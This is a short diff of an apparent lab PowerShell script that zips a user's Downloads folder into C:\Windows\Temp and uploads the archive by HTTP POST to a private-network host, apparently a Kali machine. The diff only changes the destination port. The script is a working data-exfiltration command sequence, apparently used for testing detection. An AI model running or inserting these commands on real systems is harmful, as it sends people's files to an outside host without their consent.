@@ -15,7 +15,7 @@
 
 Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force
 
-Invoke-WebRequest -Uri "http://192.168.60.135:8000/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
+Invoke-WebRequest -Uri "http://192.168.60.135:4445/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
 
 # Verify integrity against the Kali side after the transfer:
 # Get-FileHash C:\Windows\Temp\exfil_test.zip -Algorithm SHA256
